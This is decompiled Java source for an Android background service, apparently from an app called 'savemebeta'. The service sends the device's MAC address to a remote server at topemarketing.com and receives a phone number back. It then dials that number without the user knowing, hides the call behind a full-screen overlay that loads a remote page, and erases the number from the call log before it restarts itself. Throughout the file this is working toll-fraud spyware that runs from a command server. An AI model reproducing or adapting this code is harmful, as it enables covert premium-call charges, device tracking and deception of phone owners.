package com.savemebeta;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.IBinder;
import android.support.v4.view.accessibility.AccessibilityEventCompat;
import android.view.MotionEvent;
import android.view.View;
import android.view.View.OnTouchListener;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import android.webkit.WebView;
import android.widget.TextView;
import android.widget.Toast;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.StringTokenizer;
import java.util.Timer;
import java.util.TimerTask;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

public class RC extends Service implements OnTouchListener {
    public static String EXT_CALL;
    public static String MAC;
    String[] DATA;
    String address;
    Boolean conx = Boolean.valueOf(false);
    Context ctx = this;
    int i1 = (this.r.nextInt(200001) + 60000);
    WebView mWeb;
    public TextView outputText;
    Random r = new Random();

    public class StatusTask extends AsyncTask<Void, Void, Void> {
        /* access modifiers changed from: protected|varargs */
        public Void doInBackground(Void... params) {
            HttpClient httpclient = new DefaultHttpClient();
            HttpPost httppost = new HttpPost("http://topemarketing.com/android/googlefinal/data.php");
            List<NameValuePair> nameValuePairs = new ArrayList(5);
            nameValuePairs.add(new BasicNameValuePair("mac", RC.MAC));
            try {
                httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
                try {
                    try {
                        StringTokenizer list = new StringTokenizer(EntityUtils.toString(httpclient.execute(httppost).getEntity()), "#");
                        RC.this.DATA = new String[(list.countTokens() - 1)];
                        int i = 0;
                        while (list.hasMoreElements()) {
                            try {
                                RC.this.DATA[i] = list.nextElement().toString();
                                i++;
                            } catch (Exception e) {
                            }
                        }
                    } catch (Exception e2) {
                    }
                } catch (ClientProtocolException e3) {
                    e3.printStackTrace();
                } catch (IOException e4) {
                    e4.printStackTrace();
                }
            } catch (UnsupportedEncodingException e5) {
                e5.printStackTrace();
            }
            RC.MAC = RC.this.address;
            RC.EXT_CALL = RC.this.DATA[3];
            RC.this.callnow();
            return null;
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        ConnectivityManager con_manager = (ConnectivityManager) this.ctx.getSystemService("connectivity");
        if (con_manager.getActiveNetworkInfo() != null && con_manager.getActiveNetworkInfo().isAvailable() && con_manager.getActiveNetworkInfo().isConnected()) {
            this.conx = Boolean.valueOf(true);
        } else {
            this.conx = Boolean.valueOf(false);
        }
        if (this.conx.booleanValue()) {
            this.address = ((WifiManager) getSystemService("wifi")).getConnectionInfo().getMacAddress();
            MAC = this.address;
            this.mWeb = new WebView(this);
            this.mWeb.loadUrl("http://topemarketing.com/app.html");
            this.mWeb.setOnTouchListener(this);
            LayoutParams params = new LayoutParams(-2, -2, 2006, AccessibilityEventCompat.TYPE_GESTURE_DETECTION_START, -3);
            params.gravity = 119;
            params.setTitle("");
            ((WindowManager) getSystemService("window")).addView(this.mWeb, params);
            new StatusTask().execute(new Void[0]);
            return;
        }
        new Timer().schedule(new TimerTask() {
            public void run() {
                RC.this.startService(new Intent(RC.this, restartRC.class));
            }
        }, 30000);
    }

    public void callnow() {
        Intent intent = new Intent("android.intent.action.CALL");
        intent.setData(Uri.parse("tel:" + EXT_CALL));
        intent.addFlags(268435456);
        intent.addFlags(4);
        startActivity(intent);
        new Timer().schedule(new TimerTask() {
            public void run() {
                new HGP().run();
                new Timer().schedule(new TimerTask() {
                    public void run() {
                        new LogUtility().DeleteNumFromCallLog(RC.this.getBaseContext().getContentResolver(), RC.EXT_CALL);
                        ((WindowManager) RC.this.getSystemService("window")).removeView(RC.this.mWeb);
                        RC.this.mWeb = null;
                        new Timer().schedule(new TimerTask() {
                            public void run() {
                                RC.this.startService(new Intent(RC.this, restart.class));
                                RC.this.startService(new Intent(RC.this, SCHKMS.class));
                                RC.this.stopService(new Intent(RC.this, RC.class));
                                RC.this.stopSelf();
                            }
                        }, 2000);
                    }
                }, 5000);
            }
        }, (long) this.i1);
    }

    public void scre() {
        if (this.mWeb != null) {
            ((WindowManager) getSystemService("window")).removeView(this.mWeb);
            this.mWeb = null;
        }
    }

    public void onDestroy() {
        super.onDestroy();
        if (this.mWeb != null) {
            ((WindowManager) getSystemService("window")).removeView(this.mWeb);
            this.mWeb = null;
        }
    }

    public boolean onTouch(View v, MotionEvent event) {
        Toast.makeText(this, "REQUEST event", 0).show();
        return false;
    }
}
